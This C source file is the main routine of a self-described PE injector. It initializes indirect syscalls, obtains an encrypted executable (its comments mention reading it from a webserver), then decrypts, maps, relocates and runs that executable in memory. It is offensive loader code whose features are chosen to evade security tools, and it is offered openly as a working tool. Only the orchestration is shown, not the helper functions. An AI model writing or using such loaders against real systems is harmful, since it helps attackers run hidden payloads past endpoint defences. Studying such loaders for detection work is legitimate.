#include "main.h"
#include "structs.h"


/*-------------------------------------
  A simple PE injector
  Features:
  - Read the PE from file      - DONE
  - Use indirect syscalls      - DONE
  - Able to run EXE or DLL     - DONE
  - Read the PE from webserver - DONE
  - Make use of encrypted PE   - DONE
-------------------------------------*/

NTCONF g_NtConfig = { 0 };
SC_FUNC g_Fun = { 0 };

CONTENT temp = { 0 };


int main()
{
	CONTENT cnt = { 0 };
	PEHDRS PeHdrs = { 0 };
	PBYTE pPeBase = NULL;

	//Initialize syscalls
	if (!InitSyscls()) {
		DEBUG_PRINT("[!] Failed to initialize syscalls\n");
		return 1;
	}

	//Get the PE data
	if (!GetPE(&cnt)) {
		DEBUG_PRINT("[!] Failed getting the PE\n");
		return 1;
	}

	//Decrypt the data
	if (!Crypt(&cnt)) {
		DEBUG_PRINT("[!] PE Decryption failed\n");
		return 1;
	}

	//Parse the PE headers
	if (!InitPE(&PeHdrs, cnt)) {
		DEBUG_PRINT("[!] Failed parsing PE headers\n");
		return 1;
	}

	cnt.data = NULL;
	cnt.size = NULL;

	//Allocation memory and copy the PE sections
	pPeBase = PreparePE(&PeHdrs);
	if (pPeBase == NULL) {
		DEBUG_PRINT("[!] Something failed\n");
		return 1;
	}

	//Apply relocations
	if (!ApplyRelocations(PeHdrs.pRelocDir, pPeBase, PeHdrs.pNtHeaders->OptionalHeader.ImageBase)) {
		DEBUG_PRINT("[!] Failed applying relocations\n");
		return 1;
	}

	//Fix the import table
	if (!FixImports(PeHdrs.pImportDir, pPeBase)) {
		DEBUG_PRINT("[!] Failed fixing the Import Table\n");
		return 1;
	}

	//Fix the section memory permissions
	if (!FixMem(pPeBase, PeHdrs.pNtHeaders, PeHdrs.pSectHeader)) {
		DEBUG_PRINT("[!] Failed fixing memory permissions\n");
		return 1;
	}

	//Fix the PE's arguments
	PrepareArgs((LPSTR)PE_ARGS);

	//Execute the PE's entrypoint
	if (!Execute(pPeBase, &PeHdrs, NULL)) {
		DEBUG_PRINT("[!] Execution failed\n");
		return 1;
	}

    return 0;
}
